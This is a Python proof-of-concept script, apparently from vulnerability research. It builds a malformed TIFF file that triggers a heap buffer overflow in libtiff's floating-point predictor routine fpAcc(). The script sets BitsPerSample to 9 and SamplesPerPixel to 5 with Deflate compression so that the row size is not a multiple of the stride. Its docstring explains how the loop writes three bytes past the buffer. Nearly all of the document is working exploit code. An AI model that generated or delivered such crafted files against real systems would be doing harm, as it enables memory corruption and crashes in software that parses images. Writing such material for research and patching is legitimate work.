#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap Buffer Overflow in fpAcc()
via Non-Multiple-of-8 BitsPerSample with Floating-Point Predictor

Vulnerability: tif_predict.c fpAcc() lines 352-383
Setup: BitsPerSample=9, SamplesPerPixel=5, Width=3
  rowsize = TIFFhowmany8(9*3*5) = ceil(135/8) = 17 bytes
  stride  = SamplesPerPixel = 5
  17 % 5  = 2 != 0

In fpAcc, the loop:
  while (count > stride):  # count=17, stride=5
      REPEAT4(stride, cp[stride] += cp[0]; cp++)
      count -= stride

Iteration 3: cp is at index 10, REPEAT4(5,...) writes to indices:
  cp[15], cp[16] -> OK (within buffer[0..16])
  cp[17], cp[18], cp[19] -> OUT OF BOUNDS (3-byte heap overflow)
"""
import struct
import zlib
import os

OUTPUT_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    'vuln_001.tif'
)

# --- TIFF field types ---
TYPE_SHORT = 3
TYPE_LONG  = 4

# --- Tag numbers (sorted ascending) ---
TAG_IMAGEWIDTH        = 0x0100  # 256
TAG_IMAGELENGTH       = 0x0101  # 257
TAG_BITSPERSAMPLE     = 0x0102  # 258
TAG_COMPRESSION       = 0x0103  # 259
TAG_PHOTOMETRIC       = 0x0106  # 262
TAG_STRIPOFFSETS      = 0x0111  # 273
TAG_SAMPLESPERPIXEL   = 0x0115  # 277
TAG_ROWSPERSTRIP      = 0x0116  # 278
TAG_STRIPBYTECOUNTS   = 0x0117  # 279
TAG_PLANARCONFIG      = 0x011C  # 284
TAG_PREDICTOR         = 0x013D  # 317
TAG_SAMPLEFORMAT      = 0x0153  # 339

# --- Values ---
WIDTH               = 3
HEIGHT              = 1
BITS_PER_SAMPLE     = 9   # KEY: non-multiple-of-8 triggers the overflow
COMPRESSION_DEFLATE = 8   # ZIP/Deflate so predictor is applied during decode
PHOTOMETRIC         = 1   # MinIsBlack
SAMPLES_PER_PIXEL   = 5   # stride=5; combined with rowsize=17 causes 17%5=2 misalignment
ROWS_PER_STRIP      = 1
PLANARCONFIG_CONTIG = 1   # interleaved, so stride = SamplesPerPixel = 5
PREDICTOR_FP        = 3   # PREDICTOR_FLOATINGPOINT -> routes to fpAcc()
SAMPLEFORMAT_IEEEFP = 3   # IEEE floating point (value 3 per libtiff tiff.h)


def make_tag(tag, type_, count, value):
    """Pack one 12-byte IFD entry. Value fits in 4 bytes (SHORT or LONG, count=1)."""
    return struct.pack('<HHII', tag, type_, count, value)


# Raw strip: 17 bytes = ceil(9 * 3 * 5 / 8) = TIFFhowmany8(135)
RAW_SIZE = (BITS_PER_SAMPLE * WIDTH * SAMPLES_PER_PIXEL + 7) // 8  # = 17
raw_strip = bytes(RAW_SIZE)  # all zeros is valid deflate input

# Compress using zlib (TIFF compression=8 uses standard zlib-wrapped deflate)
compressed_strip = zlib.compress(raw_strip, level=1)
compressed_size  = len(compressed_strip)

# Layout:
#   [0..7]   TIFF header (8 bytes)
#   [8..]    IFD: 2-byte count + 12*12 + 4-byte next = 150 bytes
#   [158..]  Compressed strip data
NUM_TAGS    = 12
IFD_OFFSET  = 8
IFD_SIZE    = 2 + NUM_TAGS * 12 + 4   # 150 bytes
STRIP_OFFSET = IFD_OFFSET + IFD_SIZE   # 158

# TIFF little-endian header: 'II', 42, IFD offset
header = struct.pack('<2sHI', b'II', 42, IFD_OFFSET)

# IFD entries (MUST be in ascending tag order)
entries = [
    make_tag(TAG_IMAGEWIDTH,      TYPE_SHORT, 1, WIDTH),
    make_tag(TAG_IMAGELENGTH,     TYPE_SHORT, 1, HEIGHT),
    make_tag(TAG_BITSPERSAMPLE,   TYPE_SHORT, 1, BITS_PER_SAMPLE),
    make_tag(TAG_COMPRESSION,     TYPE_SHORT, 1, COMPRESSION_DEFLATE),
    make_tag(TAG_PHOTOMETRIC,     TYPE_SHORT, 1, PHOTOMETRIC),
    make_tag(TAG_STRIPOFFSETS,    TYPE_LONG,  1, STRIP_OFFSET),
    make_tag(TAG_SAMPLESPERPIXEL, TYPE_SHORT, 1, SAMPLES_PER_PIXEL),
    make_tag(TAG_ROWSPERSTRIP,    TYPE_SHORT, 1, ROWS_PER_STRIP),
    make_tag(TAG_STRIPBYTECOUNTS, TYPE_LONG,  1, compressed_size),
    make_tag(TAG_PLANARCONFIG,    TYPE_SHORT, 1, PLANARCONFIG_CONTIG),
    make_tag(TAG_PREDICTOR,       TYPE_SHORT, 1, PREDICTOR_FP),
    make_tag(TAG_SAMPLEFORMAT,    TYPE_SHORT, 1, SAMPLEFORMAT_IEEEFP),
]
assert len(entries) == NUM_TAGS

ifd = struct.pack('<H', NUM_TAGS) + b''.join(entries) + struct.pack('<I', 0)

tiff_bytes = header + ifd + compressed_strip

with open(OUTPUT_PATH, 'wb') as f:
    f.write(tiff_bytes)

print(f"[+] Wrote {len(tiff_bytes)} bytes to {OUTPUT_PATH}")
print(f"    RAW_SIZE={RAW_SIZE}  stride={SAMPLES_PER_PIXEL}  "
      f"remainder={RAW_SIZE % SAMPLES_PER_PIXEL}  "
      f"overflow_bytes={SAMPLES_PER_PIXEL - RAW_SIZE % SAMPLES_PER_PIXEL}")
print(f"    compressed_size={compressed_size}  STRIP_OFFSET={STRIP_OFFSET}")
print(f"    BitsPerSample={BITS_PER_SAMPLE}  SamplesPerPixel={SAMPLES_PER_PIXEL}  Width={WIDTH}")
